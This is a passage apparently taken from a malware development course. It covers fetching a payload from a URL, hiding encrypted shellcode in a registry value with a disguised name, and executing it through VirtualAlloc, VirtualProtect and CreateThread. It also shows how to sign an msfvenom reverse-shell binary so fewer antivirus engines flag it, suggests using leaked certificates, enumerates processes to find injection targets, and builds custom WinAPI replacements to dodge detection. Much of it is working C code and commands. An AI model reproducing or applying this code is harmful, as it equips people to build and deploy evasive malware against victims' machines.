	PBYTE		pBytes            = NULL,
			    pTmpBytes          = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL){
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL){
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL){
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE){

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}
		
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024){
			break;
		}
	}
	


	*pPayloadBytes = pBytes;
	*sPayloadSize  = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}
```

#### Implementation Note

In this module, the payload was retrieved from the internet as raw binary data, without any encryption or obfuscation. While this approach may evade basic security measures that analyze the binary code for signs of malicious activity, it'll get flagged by network scanning tools. Therefore, if the payload is not encrypted, packets captured during the transmission may contain identifiable snippets of the payload. This could expose the payload's signature, leading to the implementation process being flagged.

In real-world scenarios, it is always advised to encrypt or obfuscate the payload even if it's fetched at runtime.

### Running The Final Binary

The binary successfully fetches the payload.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/staging-demo-1.png)

The connections are closed once execution is completed.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/staging-demo-2.png)
# 3.9 Payload Staging - Windows Registry

### Introduction

The previous module showed that a payload does not necessarily need to be stored inside the malware. Instead, the payload can be fetched at runtime by the malware. This module will show a similar technique, except the payload will be written as a registry key value and then fetched from the Registry when required. Since the payload will be stored in the Registry, if security solutions scan the malware they will be unable to detect or find any payload within.

This code in this module is divided into two parts. The first part is writing the encrypted payload to a registry key. The second part reads the payload from the same registry key, decrypts it and executes it. The module will not explain the encryption/decryption process as this was explained in prior modules.

This module will also introduce the concept of??[Conditional Compilation](https://www.techonthenet.com/c_language/directives/ifdef.php).

### Conditional Compilation

Conditional compilation is a way to include code inside a project which the compiler will either compile or not compile. This will be used by the implementation to decide whether it's reading or writing to the Registry.

The two sections below provide skeleton code as to how the read and write operations will be written using conditional compilation.

#### Write Operation

```c
	#define WRITEMODE

	// Code that will be compiled in both cases
	
	// if 'WRITEMODE' is defined 
	#ifdef WRITEMODE
		// The code that will be compiled 
		// Code that's needed to write the payload to the Registry
	#endif

	// if 'READMODE' is defined 
	#ifdef READMODE
		// Code that will NOT be compiled
	#endif

```

#### Read Operation

```c
	#define READMODE

	// Code that will be compiled in both cases
	
	// if 'READMODE' is defined 
	#ifdef READMODE
		// The code that will be compiled
		// Code that's needed to read the payload from the Registry
	#endif
	
	// if 'WRITEMODE' is defined 
	#ifdef WRITEMODE
		// Code that will NOT be compiled
	#endif
	
```

### Writing To The Registry

This section will walk through the??`WriteShellcodeToRegistry`??function. The function takes two parameters:

1. `pShellcode`??- The payload to be written.
    
2. `dwShellcodeSize`??- The size of the payload to be written.
    

#### REGISTRY & REGSTRING

The code starts with two pre-defined constants??`REGISTRY`??and??`REGSTRING`??which are set to??`Control Panel`??and??`MalDevAcademy`??respectively.

```c
// Registry key to read / write
#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"
```

`REGISTRY`??is the name of the registry key that will hold the payload. The full path of??`REGISTRY`??will be??`Computer\HKEY_CURRENT_USER\Control Panel`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-img.png)

What the function will be doing programmatically is creating a new??`String Value`??under this registry key to store the payload.??`REGSTRING`??is the name of the string value that will be created. Obviously, in a real situation, use a more realistic value such as??`PanelUpdateService`??or??`AppSnapshot`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-new-string-value.png)

#### Opening a Handle To The Registry Key

The??[RegOpenKeyExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)??WinAPI is used to open a handle to the specified registry key which is a prerequisite to creating, editing or deleting values under the registry key.

```c
LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey, 		// A handle to an open registry key
  [in, optional] LPCSTR lpSubKey, 	// The name of the registry subkey to be opened (REGISTRY constant)
  [in]           DWORD  ulOptions, 	// Specifies the option to apply when opening the key - Set to 0
  [in]           REGSAM samDesired, 	// Access Rights
  [out]          PHKEY  phkResult 	// A pointer to a variable that receives a handle to the opened key
);
```

The fourth parameter of the??`RegOpenKeyExA`??WinAPI defines the access rights to the registry key. Because the program needs to create a value under the registry key,??`KEY_SET_VALUE`??was selected. The full list of registry access rights can be found??[here](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights).

```c
STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
```

#### Setting Registry Value

Next, the??[RegSetValueExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)??WinAPI is used which takes the opened handle from??`RegOpenKeyExA`??and creates a new value that is based on the second parameter,??`REGSTRING`. It will also write the payload to the newly created value.

```c
LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,            // A handle to an open registry key
  [in, optional] LPCSTR     lpValueName,     // The name of the value to be set (REGSTRING constant)
                 DWORD      Reserved,        // Set to 0
  [in]           DWORD      dwType,          // The type of data pointed to by the lpData parameter
  [in]           const BYTE *lpData,         // The data to be stored
  [in]           DWORD      cbData           // The size of the information pointed to by the lpData parameter, in bytes
);
```

It is also worth noting that the fourth parameter specifies the data type for the registry value. In this case, it's set to??`REG_BINARY`??since the payload is simply a list of bytes but the complete list of data types can be found??[here](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types).

```c
STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
```

#### Closing Registry Key Handle

Finally,??[RegCloseKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)??is used to close the handle of the registry key that was opened.

```c
LSTATUS RegCloseKey(
  [in] HKEY hKey // Handle to an open registry key to be closed
);
```

#### Writing To The Registry - Code Snippet

```c
// Registry key to read / write
#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE  = TRUE;
    LSTATUS     STATUS  = NULL;
    HKEY        hKey    = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS){
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

```

### Reading The Registry

Now that the payload has been written to the??`MalDevAcademy`??string under the??`Computer\HKEY_CURRENT_USER\Control Panel`??registry key, it is time to write the other implementation which will contain the decryption functionality that??`HellShell.exe`??provided.

This section will walk through the??`ReadShellcodeFromRegistry`??function (shown below). The function takes two parameters:

1. `sPayloadSize`??- The payload size to read.
    
2. `ppPayload`??- A buffer that will store the outputted payload.
    

#### Heap Allocation

The function starts by allocating memory to the size of??`sPayloadSize`??which will store the payload.

```c
pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
```

#### Read Registry Value

The??[RegGetValueA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetvaluea)??function requires the registry key and value to read, which are??`REGISTRY`??and??`REGSTRING`, respectively. In the previous module, it was possible to fetch the payload from the internet in several chunks of any size, however, when working with??`RegGetValueA`??this is not possible since it does not read the bytes as a stream of data but rather all at once. All of this means that knowing the payload size is a requirement in the reading implementation.

```c
LSTATUS RegGetValueA(
  [in]                HKEY    hkey,     // A handle to an open registry key
  [in, optional]      LPCSTR  lpSubKey, // The path of a registry key relative to the key specified by the hkey parameter
  [in, optional]      LPCSTR  lpValue,  // The name of the registry value.
  [in, optional]      DWORD   dwFlags,  // The flags that restrict the data type of value to be queried
  [out, optional]     LPDWORD pdwType,  // A pointer to a variable that receives a code indicating the type of data stored in the specified value
  [out, optional]     PVOID   pvData,   // A pointer to a buffer that receives the value's data
  [in, out, optional] LPDWORD pcbData   // A pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
);
```

The fourth parameter can be used to restrict the data type, however, this implementation uses??`RRF_RT_ANY`, signifying any data type. Alternatively,??`RRF_RT_REG_BINARY`??could have been used since the payload is of binary data type. Lastly, the payload is read to??`pBytes`??which was previously allocated using??`HeapAlloc`.

```c
STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
```

#### Reading Registry - Code Snippet

```c
BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {

    LSTATUS     STATUS            = NULL;
    DWORD       dwBytesRead       = sPayloadSize;
    PVOID       pBytes            = NULL;


    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
    if (pBytes == NULL){
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    if (sPayloadSize != dwBytesRead) {
        printf("[!] Total Bytes Read : %d ; Instead Of Reading : %d\n", dwBytesRead, sPayloadSize);
        return FALSE;
    }

    *ppPayload = pBytes;

    return TRUE;
}

```

#### Executing Payload

Once the payload is read from the registry and stored inside the allocated buffer, the??`RunShellcode`??function is used to execute the payload. Note that this function was explained in earlier modules.

```c

BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection   = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

```

### Writing To The Registry - Demo

Before executing the compiled code shown above, the registry key looks like this:

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-demo-1.png)

  

After running the program, a new registry string value is created with the RC4 encrypted payload.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-demo-2.png)

  

Double-clicking on??`MaldevAcademy`??will show the payload in HEX and ASCII format.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-demo-3.png)

  

### Reading The Registry - Demo

The program begins by reading the encrypted payload from the Registry.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-read-demo-1.png)

  

Next, the program will decrypt the payload.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-read-demo-2.png)

  

Finally, the decrypted payload is executed.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-read-demo-3.png)
# 4.0 Malware Binary Signing

### Introduction

When a user attempts to download a legitimate executable file from the internet, it is often signed by the company as a way of proving to the user that it is a trustworthy executable. Although security solutions will still scan the executable, additional scrutiny would've been placed on it had the binary been unsigned.

This module walks through the steps required to sign a malicious binary which can increase its trustworthiness. The module will be demonstrating binary signing on an executable generated via Msfvenom:??`msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o maldev.exe`

### Testing Binary Detection Rate

Before starting, the binary was uploaded to VirusTotal in order to see the detection rate before signing the binary. The detection rate is quite high with 52/71 vendors flagging the file as being malicious.

![VT-1](https://maldevacademy.s3.amazonaws.com/images/Basic/vt-1.png)

### Obtaining a Certificate

There are several ways to get a certificate:

- The most ideal way is to purchase the certificate from a trusted vendor such as??[DigiCert](https://www.digicert.com/).
    
- Another possibility is to use a self-signed certificate. Although this will not be as effective as a trusted certificate, this module will prove that it can still have an impact on detection rates.
    
- The last option would be to find valid certificates that are leaked on the internet (e.g. on Github). Ensure no laws are broken by using these leaked certificates.
    

### Generating a Certificate

This demo will use the self-signed certificate route. This requires??`openssl`??which is pre-built into Kali Linux.

To create a certificate first generate the required??`pem`??files. The tool requires information to include inside the certificate.

`openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365`

![PEM-Creation](https://maldevacademy.s3.amazonaws.com/images/Basic/sign.png)

Next, generate a??`pfx`??file using the??`pem`??files. The tool will ask for a key phrase to be entered.

`openssl pkcs12 -inkey key.pem -in cert.pem -export -out sign.pfx`

![PFX-Creation](https://maldevacademy.s3.amazonaws.com/images/Basic/pfx-creation.png)

### Signing The Binary

Signing the binary requires??`signtool.exe`??which is part of Windows SDK. It can be installed??[here](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/). Once that's done, the binary can be signed using the command below.

`signtool sign /f sign.pfx /p <pfx-password> /t http://timestamp.digicert.com /fd sha256 binary.exe`

Viewing the binary's properties will now show a "Digital Signature" tab which shows the details of the certificate that was used to sign the binary. It also shows a warning that the certificate is not trusted.

![Properties](https://maldevacademy.s3.amazonaws.com/images/Basic/maldev-properties.png)

### Testing Signed Binary Detection Rate

The binary is re-uploaded to VirusTotal to check if there was an impact on the detection rate. Unsurprisingly, the number of security solutions that flagged the file dropped from 52 to 47. Initially, it may not appear as a massive drop in detection rate but it must be emphasized that no changes were made to the file besides signing it with a certificate.

![VT-2](https://maldevacademy.s3.amazonaws.com/images/Basic/vt-2.png)
# Process Enumeration - EnumProcesses

### Introduction

One way to perform process enumeration was previously demonstrated in the process injection module that used??`CreateToolHelp32Snapshot`. This module will demonstrate another way to perform process enumeration using??`EnumProcesses`.

It's important for malware authors to be able to implement a technique within their malware in several ways to remain unpredictable in their actions.

### EnumProcesses

Start by reviewing Microsoft's documentation on??[EnumProcesses](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses). Notice that the function returns the Process IDs (PIDs) as an array, without the associated process names. The problem is that only having PIDs without the associated process names makes it difficult to identify the process from a human perspective.

The solution is to use the??[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess),??[GetModuleBaseName](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmodulebasenamew)??and??[EnumProcessModules](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules)??WinAPIs.

1. `OpenProcess`??will be used to open a handle to a PID with??`PROCESS_QUERY_INFORMATION`??and??`PROCESS_VM_READ`??access rights.

2. `EnumProcessModules`??will be used to enumerate all the modules within the opened process. This is required for step 3.

3. `GetModuleBaseName`??will determine the name of the process, given the enumerated process modules from step 2.


### EnumProcesses Advantage

Using the??`CreateToolhelp32Snapshot`??process enumeration method, a snapshot is created and a string comparison is performed to determine whether the process name matches the intended target process. The issue with that method is when there are multiple instances of a process running at different privilege levels, there's no way to differentiate them during the string comparison. For example, some??`svchost.exe`??processes run with normal user privileges whereas others run with elevated privileges. There is no way to determine the privilege level of??`svchost.exe`??during the string comparison. Therefore the only indicator as to whether it's privileged is if the??`OpenProcess`??call fails (assuming that the implementation is running with normal user privileges).

On the other hand, using the??`EnumProcesses`??process enumeration method provides the PID and handle to the process, and the objective is to obtain the process name. This method is guaranteed to be successful since a handle to the process already exists.

### Code Walkthrough

This section will explain code snippets that are based on??[Microsoft's example](https://learn.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes)??of process enumeration.

#### PrintProcesses Function

`PrintProcesses`??is a custom function that prints the process name and PID of the enumerated processes. Only processes running with the same privileges as the implementation can have their information retrieved. Information about elevated processes cannot be retrieved, again, assuming the implementation is running with normal user privileges. Attempts to open a handle to high-privileged processes using??`OpenProcess`??will result in??`ERROR_ACCESS_DENIED`??error.

It's possible to use??`OpenProcess`'s response as an indicator to determine if the process can be targeted. Processes that cannot have a handle open to them cannot be targeted whereas the ones with a handle successfully opened can be targeted.

```c
BOOL PrintProcesses() {

	DWORD		adwProcesses	[1024 * 2],
			    dwReturnLen1		= NULL,
			    dwReturnLen2		= NULL,
			    dwNmbrOfPids		= NULL;

	HANDLE		hProcess		= NULL;
	HMODULE		hModule			= NULL;

	WCHAR		szProc			[MAX_PATH];

	// Get the array of PIDs
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is not NULL
		if (adwProcesses[i] != NULL) {

			// Open a process handle 
			if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// If EnumProcessModules succeeded
					// Get the name of 'hProcess' and save it in the 'szProc' variable 
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Printing the process name & its PID
						wprintf(L"[%0.3d] Process \"%s\" - Of Pid : %d \n", i, szProc, adwProcesses[i]);
					}
				}

				// Close process handle 
				CloseHandle(hProcess);
			}
		}

		// Iterate through the PIDs array  
	}

	return TRUE;
}
```

### GetRemoteProcessHandle Function

The code snippet below is an update to the previous??`PrintProcesses`??function.??`GetRemoteProcessHandle`??will perform the same tasks as??`PrintProcesses`??except it will return a handle to the specified process.

The updated function uses??`wcscmp`??to verify the target process. Furthermore,??`OpenProcess`'s access control is changed from??`PROCESS_QUERY_INFORMATION | PROCESS_VM_READ`??to??`PROCESS_ALL_ACCESS`??to provide more access to the returned process object.

```c
BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

	DWORD		adwProcesses	[1024 * 2],
			    dwReturnLen1		= NULL,
			    dwReturnLen2		= NULL,
			    dwNmbrOfPids		= NULL;

	HANDLE		hProcess		= NULL;
	HMODULE		hModule			= NULL;

	WCHAR		szProc			[MAX_PATH];
	
	// Get the array of PIDs
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is not NULL
		if (adwProcesses[i] != NULL) {

			// Open a process handle 
			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// If EnumProcessModules succeeded
					// Get the name of 'hProcess' and save it in the 'szProc' variable 
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Perform the comparison logic
						if (wcscmp(szProcName, szProc) == 0) {
							wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", szProc, adwProcesses[i]);
							// Return by reference
							*pdwPid		= adwProcesses[i];
							*phProcess	= hProcess;
							break;	
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	// Check if pdwPid or phProcess are NULL
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}
```

### PrintProcesses - Example

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/enumprocesses-108501303-c0dfa0d8-5e73-431e-9f5f-3cea0bb217be.png)

### GetRemoteProcessHandle - Example

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/enumprocesses-208500959-341d233b-4852-463e-8108-6d6e4c109416.png)
# Custom WinAPI Functions

### Introduction

In the??_IAT Hiding & Obfuscation - Custom Pseudo Handles_??module, it was demonstrated that creating custom WinAPIs is a preferable approach over dynamically importing them (if possible). This approach reduces heuristic signatures and allows for code reuse in multiple implementations without causing an inconvenience, which can be the case when using API hashing.

Previously, WinAPI replacement functions were also found in the??[VX-API](https://github.com/vxunderground/VX-API), but this module will introduce custom WinAPI functions that are not found there.

### Custom Functions

As mentioned, this module will demonstrate how to build custom functions that replicate the functionality of specific WinAPIs. The custom functions that will be created are shown below.

#### Fetch Directory Functions

This module will utilize the??`PEB`??structure to fetch the following folders paths:

- The??**Temp**??folder path (Typically??`C:\Windows\temp`).
    
- The??**Windir**??folder path (Typically??`C:\Windows`).
    
- The??**AppData**??folder path (Typically??`C:\Users\username\AppData`).
    

#### Fetch System Processors Function

Additionally, the same search approach will be utilized to fetch the number of processors on the machine, serving as a partial replacement for the??[GetSystemInfo](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsysteminfo)??WinAPI.

#### Fetch Current Directory & Command Line

The??`PEB`??structure will also be utilized to fetch the following values:

- Current Directory Path - Replacing??[GetCurrentDirectory](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory).
    
- Process's Command Line - Replacing??[GetCommandLine](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinew).
    

#### Fetch PID & TID

Finally, the module will introduce two other functions that fetch the current PID and TID of a thread, replacing??[GetCurrentProcessId](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid)??and??[GetCurrentThreadId](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthreadid), respectively.

### Environment Variables

In Windows, environment variables are dynamic values that impact the behavior of processes running on a system. They store various data related to the operating system, including specific directory paths, domain and computer names, processor information, and more. These variables serve as placeholders, allowing applications to access specific system resources, directories, and configuration settings. Here are a few examples of environment variables:

- `%USERPROFILE%`??- This variable represents the current user's profile folder, which contains the user's files and settings.
    
- `%PATH%`??- This variable specifies the system's search path for executable files. It allows the user to run commands or programs from any directory without having to specify the full path to the executable.
    
- `%TEMP%`??- This variable points to the system's temporary folder, which is used by applications to store temporary files.
    

To view the environment variables on a machine one can run the??`set`??command on Windows Command Line or??`Get-ChildItem Env:`??on PowerShell. Microsoft discusses Powershell and environment variables??[here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-7.3). To view the value of a specific variable one can run??`echo %VARIABLE-NAME%`??on Cmd or??`$env:USERPROFILE`??in Powershell.

Environment variables are saved in the Windows Registry and are found in the following registry keys:

- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`??- Used to save system-wide environment variables.
    
- `HKEY_CURRENT_USER\Environment`??- Used to save user-specific environment variables.
    

### PEB & Environment Variables

When a process is created in Windows, a copy of the system environment variables is saved in the??`PEB`??structure. This allows the process to access the same environment variables as the parent process but also allows it to modify its copy of the environment variables without affecting the parent process or other processes on the system.

The image below shows the output of executing the??`!peb`??command in??[Windbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/windbg-overview)??(note that the output is truncated due to size constraints).

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-135334737-071c2d28-0567-432d-8434-02a04ed0c557.png)

In the??_Undocumented Structures_??module, it was noted that Microsoft's official documentation for the??`PEB`??structure was missing certain members. One of those excluded members is the??`Environment`??member, which provides information about where the environment variables are stored. Consequently, the original definition of the??`PEB`??structure lacks this important detail. To address this gap, the module will utilize the??`PEB`??definition from??[Process Hacker](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpebteb.h#L56), which includes the previously mentioned??`Environment`??member. This alternative definition allows us to access the necessary information regarding where the environment variables are saved.

### Enumerating PEB's Environment Variables

The??`Environment`??member is saved inside of the??[RTL_USER_PROCESS_PARAMETERS](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2653)??structure. This structure is found in the PEB structure, and was discussed in earlier modules - recall??_Process Argument Spoofing (1)_.??`RTL_USER_PROCESS_PARAMETERS`??is defined as below

```c
typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;                // The 'Environment' element

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG_PTR EnvironmentSize;
    ULONG_PTR EnvironmentVersion;

    PVOID PackageDependencyData;
    ULONG ProcessGroupId;
    ULONG LoaderThreads;

    UNICODE_STRING RedirectionDllName; 
    UNICODE_STRING HeapPartitionName; 
    ULONG_PTR DefaultThreadpoolCpuSetMasks;
    ULONG DefaultThreadpoolCpuSetMaskCount;
    ULONG DefaultThreadpoolThreadMaximum;
    ULONG HeapMemoryTypeMask; 
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
```

The image below shows the??`PEB`??being fetched and a breakpoint being set before the end of the execution of the program. The??`Environment`??member can then be seen within the??`PEB`??structure.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-235064778-455149f4-b06d-4320-9bf0-5dff7579fbf5.png)

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-335064916-a31d1618-6a9b-4d67-b575-bed090003efb.png)

Based on the previous image, the??`Environment`??member can be seen as a Unicode string array of environment variables, in which each element of that array is a variable. The??`PrintAllEnvValues`??function, shown below, uses that information to print all the elements of the environment variables array.

In order to iterate through the array, the??`PrintAllEnvValues`??function adds the size of the current environment variable, in bytes, to the current array pointer. This operation causes the pointer to point to the next element. This process continues until there are no remaining elements, which is detected by encountering a zero-sized string. The algorithm demonstrating this behavior is illustrated in the following image.

![image](https://maldevacademy.s3.amazonaws.com/new/update-one/winapi-replacement-435098465-bdb9470f-aa6b-4492-bb43-11decd0aab19.png)

The??`PrintAllEnvValues`??function shown below uses another helper function,??`GetPeb`, to fetch a pointer to the PEB structure.

```c
